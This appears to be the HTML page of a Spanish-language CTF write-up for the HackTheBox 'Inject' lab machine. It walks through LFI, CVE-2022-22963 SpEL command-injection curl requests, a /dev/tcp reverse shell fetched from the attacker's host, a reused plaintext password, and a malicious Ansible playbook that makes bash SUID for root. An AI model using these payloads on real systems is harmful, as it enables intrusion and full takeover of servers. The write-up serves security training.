@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Inject (easy) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Inject (easy)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-02T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Inject (easy)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-06-02T00:00:00-06:00","datePublished":"2024-06-02T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Inject (easy)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"},"url":"http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Inject (easy)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-06-02T00:00:00-06:00" itemprop="datePublished">
+        Jun 2, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png" />
+</p>
+
+<ul>
+  <li>Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the <code class="language-plaintext highlighter-rouge">Spring-Cloud-Function-Web</code> module susceptible to <code class="language-plaintext highlighter-rouge">CVE-2022-22963</code>. Exploiting this vulnerability grants an initial foothold as the <code class="language-plaintext highlighter-rouge">frank</code> user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for <code class="language-plaintext highlighter-rouge">phil</code>. A cronjob running on the machine can then be exploited to execute a malicious <code class="language-plaintext highlighter-rouge">Ansible</code> playbook, ultimately obtaining a reverse shell as the <code class="language-plaintext highlighter-rouge">root</code> user.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.11.204 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-02 11:53 CST
+Nmap scan report <span class="k">for </span>10.10.11.204
+Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeración-y-lfi">Enumeración y LFI</h2>
+
+<ul>
+  <li>Vemos las versiones que esta corriendo el servicio web que al parecer no son muchas.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Content</span><span class="o">-</span><span class="no">Language</span><span class="p">[</span><span class="n">en</span><span class="o">-</span><span class="no">US</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Frame</span><span class="p">,</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Home</span><span class="p">],</span> <span class="no">YouTube</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/1.png" />
+</p>
+
+<ul>
+  <li>En la parte de <strong>register</strong> no vemos nada importante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/2.png" />
+</p>
+
+<ul>
+  <li>La parte de <strong>blogs</strong> funciona y vemos algunos usuarios.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/3.png" />
+</p>
+
+<ul>
+  <li>Sin embargo hay una ruta que se llama <strong>/upload</strong> la cual esta si funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/4.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a subir un archivo cualquiera en este caso un <code class="language-plaintext highlighter-rouge">.txt</code>.</p>
+  </li>
+  <li>
+    <p>Sin embargo aunque lo subamos nos da esta respuesta.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/5.png" />
+</p>
+
+<ul>
+  <li>Si probamos con una imagen funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/6.png" />
+</p>
+
+<ul>
+  <li>Podemos ver la imagen y la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/7.png" />
+</p>
+
+<ul>
+  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> al momento de abrir la imagen y si probamos un LFI vemos que funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/8.png" />
+</p>
+
+<ul>
+  <li>Hay 2 usuarios.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/9.png" />
+</p>
+
+<ul>
+  <li>Si vemos lo que hay dentro del directorio de <code class="language-plaintext highlighter-rouge">frank</code> encontramos esto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/10.png" />
+</p>
+
+<ul>
+  <li>Aquí vemos una contraseña y un <code class="language-plaintext highlighter-rouge">.xml</code> con información.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/11.png" />
+</p>
+
+<blockquote>
+  <p>La contraseña no funciona para conectarnos por SSH.</p>
+</blockquote>
+
+<blockquote>
+  <p>El archivo de configuración que ha mostrado pertenece a Maven, que es una herramienta de gestión y comprensión de proyectos de software. Este archivo específico se usa para configurar ajustes relacionados con la construcción y gestión de proyectos en Maven By ChatGPT.</p>
+</blockquote>
+
+<ul>
+  <li>Vemos que ya nos hablan de <code class="language-plaintext highlighter-rouge">Java</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/12.png" />
+</p>
+
+<ul>
+  <li>Vemos un <code class="language-plaintext highlighter-rouge">WebApp</code> con archivos interesantes.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/13.png" />
+</p>
+
+<ul>
+  <li>Si le decimos a <code class="language-plaintext highlighter-rouge">ChatGPT</code> a que corresponden esos archivos nos dice que pertenecen a Maven.</li>
+</ul>
+
+<blockquote>
+  <p>La imagen que has proporcionado muestra una lista de archivos y directorios que son comunes en un proyecto de Java utilizando Maven como sistema de gestión y construcción de proyectos.</p>
+</blockquote>
+
+<h2 id="spring-cloud-function">Spring Cloud Function</h2>
+
+<ul>
+  <li>En el archivo <code class="language-plaintext highlighter-rouge">pom.xml</code> encontramos información incluye dependencias, propiedades del proyecto y configuraciones especificas de compilación.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/14.png" />
+</p>
+
+<ul>
+  <li>Nos da la versión que se esta utilizando para la biblioteca <code class="language-plaintext highlighter-rouge">spring-cloud-function-web</code> con versión <code class="language-plaintext highlighter-rouge">3.2.2</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/15.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Esta versión es vulnerable <a href="https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/">https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/</a>.</p>
+  </li>
+  <li>
+    <p>Aquí nos explican en que consiste y como se explota <a href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/">https://sysdig.com/blog/cve-2022-22963-spring-cloud/</a>.</p>
+  </li>
+  <li>
+    <p>Al parecer aprovecha de <code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec()</code> que es un método en Java para ejecutar comandos.</p>
+  </li>
+  <li>
+    <p>Para ver si es vulnerable vamos hacer una petición con <code class="language-plaintext highlighter-rouge">curl</code>  a la ruta <code class="language-plaintext highlighter-rouge">functionRouter</code> lo que vamos hacer es crear un archivo en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/17.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"touch /tmp/pwned"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:52:19 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:52:19.471+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>%                                   
+</code></pre></div></div>
+
+<ul>
+  <li>Si comprobamos desde el <strong>LFI</strong> vemos que efectivamente se creo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/16.png" />
+</p>
+
+<h2 id="shell-as-frank">Shell as frank</h2>
+
+<ul>
+  <li>Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> vamos a crear un <code class="language-plaintext highlighter-rouge">.sh</code> que contenga una reverse <code class="language-plaintext highlighter-rouge">shell</code> y lo vamos a compartir mediante un servidor http con python3 para poder descargarlo en la maquina victima y hacer una petición al archivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>reverse.php
+<span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
+➜  content python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora subimos el archivo a la máquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:58:15 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:58:15.168+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora le damos permisos de ejecución.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"chmod +x /tmp/reverse.sh"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:59:10 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:59:10.711+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y por ultimo lo ejecutamos para obtener <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"bash /tmp/reverse.sh"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 19:00:11 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T19:00:11.233+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.204] 42862
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>827<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+frank@inject:/<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>frank
+frank@inject:/<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-phil">Shell as phil</h2>
+
+<ul>
+  <li>Si recordamos tenemos la contraseña de <strong>phil</strong> de primeras no pudimos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> pero si podemos migrar a ese usuario desde la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span><span class="nb">cat </span>settings.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;settings <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        xsi:schemaLocation<span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;<span class="nb">id</span><span class="o">&gt;</span>Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;<span class="k">${</span><span class="nv">user</span><span class="p">.home</span><span class="k">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+frank@inject:~/.m2<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span>su phil
+Password:
+phil@inject:/home/frank/.m2<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
+phil@inject:/home/frank/.m2<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+8dc5c8c4c03735847448fbf460738832
+phil@inject:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>Al no encontrar nada interesante decidí ejecutar <code class="language-plaintext highlighter-rouge">pspy64</code> para ver tareas <code class="language-plaintext highlighter-rouge">cron</code> y encontré esta, corre <code class="language-plaintext highlighter-rouge">ansible-parallel</code> <a href="https://pypi.org/project/ansible-parallel/">https://pypi.org/project/ansible-parallel/</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/escalada.png" />
+</p>
+
+<ul>
+  <li>Allí vemos la estructura del <code class="language-plaintext highlighter-rouge">.yml</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">cd </span>tasks/
+phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls
+</span>playbook_1.yml
+phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_1.yml
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: <span class="nb">yes
+      </span>state: started
+phil@inject:/opt/automation/tasks<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que el directorio <code class="language-plaintext highlighter-rouge">tasks</code> corresponde al grupo staff y nosotros estamos allí y podemos escribir.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
+phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cd</span> ..
+phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+drwxrwxr-x 2 root staff 4096 Jun  2 19:26 tasks
+</code></pre></div></div>
+
+<ul>
+  <li>Como es una tarea cron lo que vamos hacer es asignarle privilegios <code class="language-plaintext highlighter-rouge">SUID</code> ala <code class="language-plaintext highlighter-rouge">bash</code> usando el modulo <code class="language-plaintext highlighter-rouge">ansible.builtin.shell</code> <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_2.yml
+- hosts: localhost
+  tasks:
+    - name: SUID
+      ansible.builtin.shell: |
+        <span class="nb">chmod</span> +s /bin/bash
+      become: <span class="nb">true
+</span>phil@inject:/opt/automation/tasks<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a esperar a que se ejecute la tarea y ver si las <code class="language-plaintext highlighter-rouge">bash</code> se le otorga el privilegio <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
+<span class="nt">-rwsr-sr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
+phil@inject:/opt/automation/tasks<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<ul>
+  <li>Ahora ya estamos como <code class="language-plaintext highlighter-rouge">root</code> y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">whoami
+</span>root
+bash-5.0# <span class="nb">cat</span> /root/root.txt
+5a756880b37d955eee4996c9ef8a0620
+bash-5.0#
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/easy/2024/06/02/inject.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
